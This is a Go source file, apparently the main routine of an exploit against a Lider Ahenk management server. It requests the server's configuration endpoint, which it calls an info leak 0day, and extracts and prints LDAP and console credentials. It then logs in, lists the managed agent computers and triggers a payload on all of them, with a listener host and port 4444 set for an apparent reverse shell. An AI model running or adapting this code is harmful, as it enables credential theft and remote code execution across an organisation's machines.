package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
)

var TARGET, LHOST, LPORT string

func main(){

	print_info("Starting the exploit")

	TARGET = "192.168.179.134"

	LHOST = "172.26.64.120"
	LPORT = "4444"

	TARGETURI :=  "http://192.168.179.134:8080/lider/config/configurations"

	res, err := http.Get(TARGETURI)

	if err != nil {
		panic_with_msg("Target is unable to reach", err)
	}

	defer res.Body.Close()

	print_info("Exploiting the info leak 0day vulnerability")
	body, err := ioutil.ReadAll(res.Body)

	if err != nil {
		panic_with_msg("Unable to read JSON response", err)
	}
	if !strings.Contains(string(body), "ldapUsername") {
		panic_with_msg("Something wrong with the response ! Do manuel check.", err)
	}

	lider := new(LiderAhenkConfig)

	err2 := json.Unmarshal(body, lider)

	if err2 != nil {
		panic_with_msg("Unable to unmarshal the LiderAhenkConfig", err)
	}

	print_good("Successfully exploited the info leak 0day !")

	print_info("Parsing the credentials")

	// Printing the important credentials with different colours

	lider.PrintCredentials()

	// Overrinding the LDAP address with targets NAT ip
	lider.LdapServer = TARGET

	lider.CheckLDAPCredentials()

	lider.FetchAgentComputers()

	cu := lider.FetchLiderConsoleUser()

	cu.Login()

	fmt.Println(cu)

	agents := cu.NewAgents(lider.AgentLdapBaseDn)

	cu.TriggerPayloadonAllAgents(agents)
	//fmt.Println(NewPayload())


}